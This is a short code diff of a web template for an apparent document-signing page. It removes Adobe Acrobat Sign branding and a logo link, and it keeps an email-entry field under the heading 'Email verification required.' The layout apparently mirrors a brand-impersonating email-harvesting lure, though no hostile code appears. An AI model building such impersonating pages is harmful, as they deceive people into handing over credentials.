@@ -4,22 +4,14 @@
       <div class="sign-card">
         <div class="header">
           <div class="logo-text">
-            <span class="person-icon">⼈</span> Adobe Acrobat Sign
-          </div>
-          <img
-            class="adobe-logo"
-            src="https://na4.documents.adobe.com/images/emailNextGen/email-adobe-tag-classic@2x.png"
-            alt="Adobe Logo"
-          />
+          
         </div>
 
         <div class="success-check">✓</div>
 
         <div class="content">
-          <p><strong>Verify the intended recipient's email.</strong></p>
-          <p>
-            Enter the email address to which this item was shared to sign your
-            document.
+          <p><strong>Email verification required.</strong></p>
+          
           </p>
           <input
             v-model="email"
